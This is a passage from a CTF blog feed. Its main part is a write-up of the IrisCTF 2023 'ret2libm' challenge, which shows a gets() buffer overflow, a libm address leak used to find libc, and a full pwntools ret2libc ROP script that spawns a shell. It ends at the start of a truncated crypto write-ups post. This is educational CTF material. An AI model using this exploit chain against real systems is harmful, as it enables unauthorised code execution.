&lt;p&gt;Unfortunately this CTF was right in the middle of my exams so I couldn&amp;rsquo;t dedicate full time to it, but I hope to play with everyone again and hopefully qualify next year! Thanks for reading!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;teddy / TheSavageTeddy&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
    <item>
      <title>ret2libm - IrisCTF 2023</title>
      <link>https://TheSavageTeddy.github.io/posts/ret2libm-iris2023/</link>
      <pubDate>Mon, 09 Jan 2023 00:00:00 +0800</pubDate>
      
      <guid>https://TheSavageTeddy.github.io/posts/ret2libm-iris2023/</guid>
      <description>Overview ret2libm was the 2nd most solved pwn challenge of IrisCTF 2023, written by sera.
Description:
I need to make a pwn? Let&amp;rsquo;s go with that standard warmup rop thing&amp;hellip; what was it&amp;hellip; ret2libm?
We are provided with a zip file containing a binary, source code, libc, libm, and Makefile.
c chal.c #include &amp;lt;math.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; // gcc -fno-stack-protector -lm int main(int argc, char* argv) { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); char yours[8]; printf(&amp;#34;Check out my pecs: %p\n&amp;#34;, fabs); printf(&amp;#34;How about yours?</description>
      <content>&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;ret2libm&lt;/code&gt; was the 2nd most solved &lt;code&gt;pwn&lt;/code&gt; challenge of &lt;a href=&#34;https://ctftime.org/event/1774&#34;&gt;IrisCTF 2023&lt;/a&gt;, written by &lt;code&gt;sera&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Description:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I need to make a pwn? Let&amp;rsquo;s go with that standard warmup rop thing&amp;hellip; what was it&amp;hellip; ret2libm?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are provided with a zip file containing a binary, source code, &lt;code&gt;libc&lt;/code&gt;, &lt;code&gt;libm&lt;/code&gt;, and Makefile.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;c&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;chal.c&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-c&#34; &gt;&lt;code&gt;
#include &amp;lt;math.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

// gcc -fno-stack-protector -lm

int main(int argc, char* argv) {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    char yours[8];

    printf(&amp;#34;Check out my pecs: %p\n&amp;#34;, fabs);
    printf(&amp;#34;How about yours? &amp;#34;);
    gets(yours);
    printf(&amp;#34;Let&amp;#39;s see how they stack up.&amp;#34;);

    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;2&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;makefile&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;Makefile&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-makefile&#34; &gt;&lt;code&gt;
chal: chal.c
    gcc -fno-stack-protector chal.c -o chal -lm
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;The &lt;code&gt;gets()&lt;/code&gt; function is clearly a classic buffer overflow vulnerability as it reads in any amount of bytes regardless of what the buffer &lt;code&gt;yours[8]&lt;/code&gt; can actually hold. Therefore we can overwrite the return pointer &lt;code&gt;rip&lt;/code&gt; and control what code it executes next.&lt;/p&gt;
&lt;p&gt;There also isn&amp;rsquo;t a canary we need to bypass.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using &lt;code&gt;pwndbg&lt;/code&gt; we find the offset to be &lt;code&gt;16&lt;/code&gt; bytes until we overwrite the return pointer.&lt;/p&gt;
&lt;h1 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h1&gt;
&lt;p&gt;The next step is to do a classic &lt;code&gt;ret2libc&lt;/code&gt;. However, there is ASLR that we need to bypass, as the &lt;code&gt;libc&lt;/code&gt; library is loaded into a different address each time. The program just so happens to give us a leak from the &lt;code&gt;libm&lt;/code&gt; library which &lt;em&gt;should&lt;/em&gt; allow us to calculate the &lt;code&gt;libc&lt;/code&gt; base address.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Check out my pecs: %p&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, fabs);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I assumed the &lt;code&gt;fabs&lt;/code&gt; address would be a &lt;strong&gt;constant offset&lt;/strong&gt; from the &lt;code&gt;libc&lt;/code&gt; base address, so after finding that offset we should be able to calculate it.&lt;/p&gt;

  &lt;img src=&#34;./img/procmap.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;&lt;code&gt;libc&lt;/code&gt; base shown here is &lt;code&gt;0x7f0f11c0b000&lt;/code&gt;, the &lt;code&gt;fabs&lt;/code&gt; leak was &lt;code&gt;0x7f0f11e2e4d0&lt;/code&gt;, so calculating &lt;code&gt;fabs - libc = 0x7f0f11e2e4d0 - 0x7f0f11c0b000 = 0x2234d0&lt;/code&gt; we get an offset of &lt;code&gt;0x2234d0&lt;/code&gt;. So to calculate the libc base address from the fabs leak, we simply do &lt;code&gt;libc.address = fabs - 0x2234d0&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;WAIT!&lt;/strong&gt; - The &lt;code&gt;libm&lt;/code&gt; and &lt;code&gt;libc&lt;/code&gt; binary used by our linux system is probably different to the ones given! We need to patch the binary to use the provided libraries &lt;code&gt;libc-2.27.so&lt;/code&gt; and &lt;code&gt;libm-2.27.so&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;pwninit&lt;/code&gt; is a popular tool for this, however, it only links the &lt;code&gt;libc&lt;/code&gt; file - we need to link both &lt;code&gt;libc&lt;/code&gt; and &lt;code&gt;libm&lt;/code&gt;. Therefore we will use &lt;code&gt;patchelf&lt;/code&gt; (which pwninit uses anyways).&lt;/p&gt;
&lt;p&gt;Making a copy of the binary &lt;code&gt;chal_patched&lt;/code&gt; and running &lt;code&gt;patchelf --add-needed libm-2.27.so chal_patched&lt;/code&gt; and &lt;code&gt;patchelf --add-needed libc-2.27.so chal_patched&lt;/code&gt; we have linked the binary to use those libraries instead of our system ones!If we didn&amp;rsquo;t do so, our payload may work on our system, but not the remote as they are using different libraries with different addresses and sizes.&lt;/p&gt;
&lt;p&gt;Now that we&amp;rsquo;ve linked the correct libraries, we need to recalculate the offset &lt;code&gt;0x7ffff7a66cf0 - 0x7ffff7644000 = 0x422cf0&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Okay lets setup a pwntools script to automate this!&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;filepath &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./chal_patched&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(filepath)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;libc-2.27.so&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(filepath)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;input() &lt;span style=&#34;color:#75715e&#34;&gt;# wait for gdb debug (gdb -p &amp;lt;PID&amp;gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libc_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7ffff7a66cf0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7ffff7644000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Check out my pecs: &amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fabs_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fabs_addr &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc_offset
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address) &lt;span style=&#34;color:#e6db74&#34;&gt;= }&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can reaffirm that the address is correct by using &lt;code&gt;gdb -p &amp;lt;PID&amp;gt;&lt;/code&gt; to attach to the process, and check if the calculated address is correct.&lt;/p&gt;

  &lt;figure class=&#34;center&#34; &gt;
    &lt;img src=&#34;./img/libcbasecalc.png&#34;   style=&#34;border-radius: 8px;&#34;  /&gt;
    
      &lt;figcaption class=&#34;left&#34; &gt;&lt;i&gt;and it indeed is...&lt;/i&gt;&lt;/figcaption&gt;
    
  &lt;/figure&gt;


&lt;p&gt;Now we have the &lt;code&gt;libc&lt;/code&gt; address we can do a standard &lt;code&gt;ret2libc&lt;/code&gt;. I will not go in-depth on this as it&amp;rsquo;s covered a lot, check out &lt;a href=&#34;https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc&#34;&gt;this amazing resource&lt;/a&gt; if you want to fully grasp it.&lt;/p&gt;
&lt;p&gt;Using &lt;code&gt;ROPgadget&lt;/code&gt; to find gadgets in &lt;code&gt;libc&lt;/code&gt; (I chose &lt;code&gt;libc&lt;/code&gt; instead of the binary as we already had its base address, didn&amp;rsquo;t want to do another calculation), we find the required &lt;code&gt;pop rdi; ret&lt;/code&gt; gadget as per &lt;a href=&#34;https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions#64-bit&#34;&gt;64 bit calling conventions&lt;/a&gt; to pass the &lt;code&gt;/bin/sh&lt;/code&gt; string into &lt;code&gt;system()&lt;/code&gt;, and another &lt;code&gt;ret&lt;/code&gt; gadget for stack alignment.&lt;/p&gt;
&lt;p&gt;Now we simply return to libc!&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;filepath &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./chal_patched&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(filepath)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;libc-2.27.so&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(filepath)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;input() &lt;span style=&#34;color:#75715e&#34;&gt;# wait for gdb debug&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libc_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7ffff7a66cf0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7ffff7644000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Check out my pecs: &amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fabs_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fabs_addr &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc_offset
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address) &lt;span style=&#34;color:#e6db74&#34;&gt;= }&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pop_rdi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000000000002164f&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00000000000008aa&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;system &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;binsh &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; next(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;search(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/bin/sh&amp;#39;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; flat(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; offset,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ret, &lt;span style=&#34;color:#75715e&#34;&gt;# stack alignment&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    pop_rdi,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    binsh,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    system,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Running this we indeed get a shell!&lt;/p&gt;

  &lt;img src=&#34;./img/yayshell.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;Now all we have to do is to connect to remote and do the same &amp;hellip; right? Apparently not. Running the script gives us an EOF, meaning the program crashed or ended.&lt;/p&gt;

  &lt;img src=&#34;./img/verysad.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;This is the last thing we want to see - our exploit working locally, but not on remote! When this happened I first thought I didn&amp;rsquo;t link the libraries correctly, but after relinking and additional testing that didn&amp;rsquo;t seem to be the case. Having no other idea what it could be, I opened a ticket on the &lt;a href=&#34;https://discord.com/invite/TJMssbJV&#34;&gt;discord server&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;After explaining my issue, the organiser &lt;code&gt;sera&lt;/code&gt; released a Dockerfile that allowed the remote enviroment to be built on your own computer! This meant we could now debug on an enviroment identical to the remote instance, and potentially find out the issue.&lt;/p&gt;
&lt;p&gt;After doing so, my payload unfortunetly still worked without modifications, which was really weird as the enviroment was supposedly identical to the remote instance. &lt;code&gt;sera&lt;/code&gt; mentioned it could be that the &lt;code&gt;libc&lt;/code&gt; was in fact &lt;em&gt;not&lt;/em&gt; a constant offset of &lt;code&gt;fabs&lt;/code&gt; function from &lt;code&gt;libm&lt;/code&gt; on the remote instance, which meant the &lt;code&gt;libc.address&lt;/code&gt; would be wrong.&lt;/p&gt;

  &lt;img src=&#34;./img/whynoworklol.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;&lt;code&gt;sera&lt;/code&gt; verified that the scripts work on their docker as well, so decided to award me the flag anyways regardless of it not working on remote.&lt;/p&gt;

  &lt;img src=&#34;./img/wowflag.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;First time I&amp;rsquo;ve just been handed the flag by organisers, even in other competitions (&lt;em&gt;cough&lt;/em&gt; Pecan CTF) where challenges were literally broken and we had the solution, organisers wouldn&amp;rsquo;t award points, so huge thanks to &lt;code&gt;sera&lt;/code&gt; for the help and flag!&lt;/p&gt;
&lt;p&gt;The intended solution was to use a one-gadget in the libc and a libc address already in &lt;code&gt;rax&lt;/code&gt; to (i assume) calculate the offset.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Overall this was a pretty fun challenge despite the hours of trying to figure out why it wouldn&amp;rsquo;t work on remote, I only started learning &lt;code&gt;pwn&lt;/code&gt; recently and was glad theres a CTF with &lt;code&gt;pwn&lt;/code&gt; challenges I could solve.&lt;/p&gt;
&lt;p&gt;In the end we (&lt;a href=&#34;https://ctftime.org/team/160273&#34;&gt;PissedEmu&lt;/a&gt;) placed &lt;code&gt;11th&lt;/code&gt; on the &lt;a href=&#34;https://ctftime.org/event/1774&#34;&gt;leaderboard&lt;/a&gt; which I&amp;rsquo;m happy about!&lt;/p&gt;
&lt;p&gt;Additional thanks to the organisers for hosting IrisCTF 2023, I&amp;rsquo;ll be looking forward to next year&amp;rsquo;s event!&lt;/p&gt;
&lt;p&gt;Also, please DM me on Discord at &lt;code&gt;TheSavageTeddy#7458&lt;/code&gt; if there are issues or things I missed in this blog post as it is my first.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Crypto Writeups - IrisCTF 2023</title>
      <link>https://TheSavageTeddy.github.io/posts/crypto-iris2023/</link>
      <pubDate>Mon, 09 Jan 2023 00:00:00 +0800</pubDate>
      
      <guid>https://TheSavageTeddy.github.io/posts/crypto-iris2023/</guid>
      <description>Overview I solved 4/6 crypto challenges in IrisCTF 2023, here are the writeups for them.
Challenges (dynamic scoring):
babynotrsa by sera - 145 solves babymixup by sera - 98 solves Nonces and Keys by lambda - 53 solves AES-BAD-256 by sera - 18 solves babynotrsa - 145 solves Everyone knows RSA, but everyone also knows that RSA is slow. Why not just use a faster operation than exponentiation?
We are given a source and output:</description>
      <content>&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;I solved 4/6 crypto challenges in IrisCTF 2023, here are the writeups for them.&lt;/p&gt;
&lt;p&gt;Challenges (dynamic scoring):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#babynotrsa---145-solves&#34;&gt;&lt;code&gt;babynotrsa&lt;/code&gt;&lt;/a&gt; by &lt;code&gt;sera&lt;/code&gt; - 145 solves&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#babymixup---98-solves&#34;&gt;&lt;code&gt;babymixup&lt;/code&gt;&lt;/a&gt; by &lt;code&gt;sera&lt;/code&gt; - 98 solves&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#nonces-and-keys---53-solves&#34;&gt;&lt;code&gt;Nonces and Keys&lt;/code&gt;&lt;/a&gt; by &lt;code&gt;lambda&lt;/code&gt; - 53 solves&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#aes-bad-256---18-solves&#34;&gt;&lt;code&gt;AES-BAD-256&lt;/code&gt;&lt;/a&gt; by &lt;code&gt;sera&lt;/code&gt; - 18 solves&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;babynotrsa---145-solves&#34;&gt;babynotrsa - 145 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Everyone knows &lt;a href=&#34;https://en.wikipedia.org/wiki/RSA_(cryptosystem)&#34;&gt;RSA&lt;/a&gt;, but everyone also knows that RSA is slow. Why not just use a faster operation than exponentiation?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are given a source and output:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;chal.py&lt;/span&gt;
